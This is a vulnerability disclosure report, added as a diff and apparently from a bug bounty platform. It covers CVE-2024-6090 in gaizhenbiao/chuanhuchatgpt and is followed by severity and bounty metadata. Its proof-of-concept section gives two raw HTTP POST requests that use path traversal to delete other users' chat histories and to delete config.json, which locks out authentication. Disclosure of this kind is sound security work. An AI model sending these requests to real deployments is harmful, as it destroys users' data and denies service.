@@ -1,0 +1,50 @@
+Title: Deleting Other User's Chat History in gaizhenbiao/chuanhuchatgpt
+
+Proof of Concept: 
+Deleting chats
+
+An attacker can very simply send the following request to delete other user's chats via a path traversal
+
+POST /queue/join? HTTP/1.1
+Host: 127.0.0.1:7860
+Cookie: access-token-Am86qIikSe34XMu5FQqcu0jasA_03gF2Wy8qA0pI5u4=f-Jm7TzZPwosPrsxQvaXfw; access-token-unsecure-Am86qIikSe34XMu5FQqcu0jasA_03gF2Wy8qA0pI5u4=f-Jm7TzZPwosPrsxQvaXfw;
+Content-Length: 118
+
+{"data":[null,"history/pink/pink",null],"event_data":null,"fn_index":38,"trigger_id":29,"session_hash":"imzrkogx1n"}
+
+Note the string history/pink/pink. This deletes the chat named pink for the user pink. An attacker can change this string to delete any chats.
+
+Deleting config.json, causing a denial of service
+
+An attacker can very simply send the following request to delete the config.json file.
+
+POST /queue/join? HTTP/1.1
+Host: 127.0.0.1:7860
+Cookie: access-token-Am86qIikSe34XMu5FQqcu0jasA_03gF2Wy8qA0pI5u4=f-Jm7TzZPwosPrsxQvaXfw; access-token-unsecure-Am86qIikSe34XMu5FQqcu0jasA_03gF2Wy8qA0pI5u4=f-Jm7TzZPwosPrsxQvaXfw;
+Content-Length: 118
+
+{"data":[null,"config",null],"event_data":null,"fn_index":38,"trigger_id":29,"session_hash":"imzrkogx1n"}
+
+If you now attempt to authenticate with the service, you will notice that it's not possible, since credentials are read from the config, which has now been removed.
+
+Impact: 
+This vulnerability leads to the loss of data, as well as to a denial of service.
+
+CVE ID: CVE-2024-6090
+Status: (published)
+Vulnerability Type: CWE-400: Denial of Service
+Severity: High (7.5)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: None
+Availability: High
+Registry: Pypi
+Affected Version: 20240410
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $450
+Fix Bounty: $112.5
